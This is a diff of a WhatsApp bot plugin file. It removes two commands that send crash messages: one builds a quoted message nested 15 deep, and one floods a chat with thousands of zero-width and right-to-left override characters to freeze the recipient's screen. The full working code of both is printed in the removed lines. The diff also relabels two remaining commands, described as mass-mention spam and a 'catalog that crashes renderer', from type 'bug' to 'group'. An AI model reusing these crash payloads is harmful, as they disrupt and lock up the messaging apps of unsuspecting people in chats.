@@ -3627,85 +3627,6 @@ kord({
 
 
 
-kord({
-   cmd:"bugtest4",
-   desc:"Nested quote nuke"
-},async(m)=>{
-   try{
-       let baseMsg = { message:{ conversation:" YOU'RE DONE" } };
-       let key = { id:`${Math.random()}`, remoteJid:m.chat, fromMe:false };
-
-       for(let depth=0;depth<15;depth++){
-           baseMsg = { 
-               message:{ 
-                   extendedTextMessage:{
-                       text:"QUAKE ENGAGEd",
-                       contextInfo:{
-                           quotedMessage:{...baseMsg.message},
-                           stanzaId:key.id,
-                           participant:key.remoteJid,
-                           quotedMessageContextInfo:new Map()
-                       }
-                   }
-               }
-           };
-           key.id += "_x";
-       }
-
-       await m.client.relayMessage(m.chat,{
-           messageContextInfo:{
-               deviceListMetadataVersion:{ version:[1] },
-               deviceListMetadata:{}
-           },
-           ...baseMsg.message
-       },{});
-
-       await sleep(1);
-       await m.send("* Quake delivered.*");
-   }catch(e){
-       console.log("QSPAM ERR",e);
-   }
-});
-
-
-
-
-
-
-
-
-
- kord({
-    cmd:"bugtest3",
-    desc:"Freeze UI with invisible chars",
-    fromMe:true,
-}, async(m)=>{
-   try{
-      let payload = "";
-      for(let i=0;i<9999;i++){
-         payload += String.fromCharCode(
-             Math.random() > 0.5 ? 8203 : // Zero Width Space
-             Math.random() > 0.5 ? 8234 : // Left-To-Right Override
-             Math.random() > 0.5 ? 8238 : // Right-To-Left Override
-             Math.random() > 0.7 ? '\u202E' : '\uFEFF' // BOM + RTL Exploit Chars
-         );
-      }
-
-      await m.client.sendMessage(m.chat,{
-          text:`[⚠️ RENDER_KILLER_ACTIVE ]${payload}`
-      });
-
-      await m.send("Text sent zyr.");
-   }catch(e){
-       console.log(e);
-   }
-});
-
-
-
-
-
-
 
 
 
@@ -3714,7 +3635,7 @@ kord({
     desc: "Spam insane mentions",
     gc: true,
     fromMe: true,
-    type:"bug"
+    type: "group"
 }, async (m) => {
     try {
         const jid = m.chat;
@@ -3757,7 +3678,7 @@ kord({
     desc: "Send invisible catalog that crashes renderer",
     gc: true,
     fromMe: true,
-    type: "bug"
+    type: "group"
 }, async (m) => {
     try {
         const jid = m.chat;
